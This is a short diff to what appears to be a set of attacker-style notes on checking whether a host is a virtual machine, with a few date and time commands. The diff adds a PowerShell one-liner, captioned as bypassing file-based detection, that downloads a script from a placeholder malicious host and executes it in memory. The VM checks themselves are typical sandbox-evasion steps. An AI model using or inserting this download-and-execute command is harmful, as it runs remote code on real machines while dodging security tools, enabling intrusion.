@@ -2,6 +2,9 @@ Check if VM exist in a host:
 Check HKEY_CLASSES_ROOT for file extension
 Check network adapters
 
+Bypasses file-based detection and executes malicious code directly in memory:
+iex((New-Object Net.WebClient).DownloadString('https://malware.com/payload.ps1'))
+
 date &  time
 echo | date >> file.txt
 
